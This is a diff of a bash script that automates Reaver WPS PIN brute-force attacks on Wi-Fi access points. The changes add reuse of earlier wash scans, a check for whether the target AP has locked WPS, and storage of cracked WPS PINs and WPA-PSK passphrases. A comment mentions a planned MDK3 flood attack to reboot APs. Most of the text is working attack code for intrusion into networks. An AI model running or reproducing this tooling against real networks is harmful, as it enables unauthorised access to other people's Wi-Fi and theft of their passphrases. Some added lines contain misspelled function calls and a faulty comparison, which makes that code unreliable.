@@ -12,7 +12,7 @@
 ###### You can adjust some Reaver settings during the script execution or manually change them in configurationSettings file.
 ###### In the end, after it loops all BSSID list, the script will exit after stoping Monitor Mode, reseting device driver and
 ###### restarting Netwok Manager service, systemctl restart NetworkManager .
-###### Found PINS are stored in CRACKED directory.
+###### Found WPS-PIN And WPA-PSK are stored in CRACKED directory.
 ###################################################################################################################################################
 ###### REQUIREMENTS:
 ###### Reaver v1.6.6 (the version im using, dont know with older versions)
@@ -127,36 +127,58 @@ setAPSettings(){
 	local YN;
 	local nTIME;
 	local CMD_WASH;
+	local WASH_SCAN=1;
 
-	while true; do
-		read -p "AP Scan Time Set to $WASH_TIME Sec., Change (Y/N)? " YN;
+	if [[ -f $REAVER_TMP_DIR'/wash.list' && $RESCAN_AP -eq 0 ]]; then
+		while true; do
+			read -p "Use Last WASH Scan (Y/N)?" YN && echo "";
 
-		case $YN in
-			[Yy]* )
-				while true; do
-					read -p "Set New Scan Time [Current $WASH_TIME Sec.], (1-120): " nTIME
+			case $YN in
+				[Yy]* )
+					WASH_SCAN=0;
+					break;;
+				[Nn]* )
+					WASH_SCAN=1;
+					break;;
+				* )
+					echoOrange "Invalid Selection......";;
+			esac
+		done
+	else
+		WASH_SCAN=1;
+	fi
 
-					if [[ $nTIME -ge 1 && $nTIME -le 120 ]]; then
-						WASH_TIME=$nTIME;
-						break;
-					else
-						echoOrange "Invalid Selection......";
-					fi
-				done
-				;;
-			[Nn]* )
-				break;;
-			* )
-				echoOrange "Invalid Selection......";;
-		esac
-	done
+	if [[ $WASH_SCAN -eq 1 ]]; then
+		while true; do
+			read -p "AP Scan Time Set to $WASH_TIME Sec., Change (Y/N)? " YN;
 
-	echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
-	echoBlue "Please Wait...";
-	echo "";
+			case $YN in
+				[Yy]* )
+					while true; do
+						read -p "Set New Scan Time [Current $WASH_TIME Sec.], (1-120): " nTIME
 
-	CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
-	eval $CMD_WASH >>/dev/null;
+						if [[ $nTIME -ge 1 && $nTIME -le 120 ]]; then
+							WASH_TIME=$nTIME;
+							break;
+						else
+							echoOrange "Invalid Selection......";
+						fi
+					done
+					;;
+				[Nn]* )
+					break;;
+				* )
+					echoOrange "Invalid Selection......";;
+			esac
+		done
+
+		echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
+		echoBlue "Please Wait...";
+		echo "";
+
+		CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
+		eval $CMD_WASH >>/dev/null;
+	fi
 
 	unset option AP_LIST ERROR;
 	declare -a AP_LIST;
@@ -174,6 +196,7 @@ setAPSettings(){
 
 			case $YN in
 				[Yy]* )
+					RESCAN_AP=1;
 					setAPSettings;;
 				[Nn]* )
 					echoBlue "Exiting..."
@@ -219,6 +242,7 @@ setAPSettings(){
 				echoRed "All... is Currently Unavailable. Please Select Single Target.";
 			elif [[ "$APCHOICE" == "r" || "$APCHOICE" == "R" ]]; then
 				clear;
+				RESCAN_AP=1;
 				setAPSettings;
 				break;
 			else
@@ -228,6 +252,7 @@ setAPSettings(){
 	done
 
 	unset AP_LIST;
+	RESCAN_AP=0;
 }
 
 setAutoReaverOpt(){
@@ -322,6 +347,49 @@ reaverConfig(){
 
 
 	unset ARR_REAVER_OPT;
+}
+
+checkAPLockStatus(){
+	local CMD_LOCK_STATUS;
+	local WASH_OUTPUT;
+	local AP_DETECTED=0;
+
+	CMD_LOCK_STATUS="timeout --preserve-status $CHECK_APLOCK_TIMEOUT wash -i $WIFI_CARD_MONITOR";
+	echoBlue "Checking AP Lock Status (Timeout For Result In $CHECK_APLOCK_TIMEOUT Sec)......";
+
+	if [[ ! -f $STATUS_FILE ]]; then
+		touch $STATUS_FILE;
+		ehoGreen "Status File for $AP_BSSID Created......";
+		echo $(date +"- - - - BOF") > $STATUS_FILE
+	else
+		choBlue "Status File for $AP_BSSID Found......";
+	fi
+
+	eval $CMD_LOCK_STATUS | {
+		while read -r WASH_OUTPUT; do
+			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") != 0 ]]; then
+				AP_DETECTED=1;
+
+				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) -eq "Yes" ]]; then
+					echo $(date +"%d/%m/%Y %H:%M:%S - $AP_LOCK AP_CHECK_STATUS_LOCKED") >> $STATUS_FILE;
+					echoRed "AP Is Locked......";
+				else
+					echo $(date +"%d/%m/%Y %H:%M:%S - $AP_LOCK AP_CHECK_STATUS_UNLOCKED") >> $STATUS_FILE;
+					echoGreen "AP Is UnLocked......";
+				fi
+			else
+				AP_DETECTED=0;
+			fi
+		done
+
+		if [[ $AP_DETECTED == 0 ]]; then
+			echo $(date +"%d/%m/%Y %H:%M:%S - $AP_LOCK AP_NOT_FOUND") >> $STATUS_FILE;
+			echoRed "AP Not Found......";
+		fi
+
+		$(killall -I wash);
+	}
+
 }
 
 getRandomMac(){
@@ -614,7 +682,7 @@ STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'
 
 if [[ ! -f $STATUS_FILE ]]; then
 	touch $STATUS_FILE;
-	echo $(date +"%d/%m/%Y %H:%M:%S - - BOF") > $STATUS_FILE
+	echo $(date +"- - - - BOF") > $STATUS_FILE
 	echoGreen "Status File for $AP_BSSID Created......";
 else
 	echoBlue "Status File for $AP_BSSID Found......";
@@ -686,7 +754,7 @@ while true; do
 				break;
 				### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
 			else
-				if [[ $REAVER_ATTEMPT_DELAY -ge 600 ]]; then
+				if [[ $REAVER_ATTEMPT_DELAY -ge $MAX_DELAY_PIN ]]; then
 					echoRed "Delay Between PIN Attempt Reached $REAVER_ATTEMPT_DELAY Sec.";
 					echoBlue "AP Is Not Locked, Try running the Script Again......";
 					break;
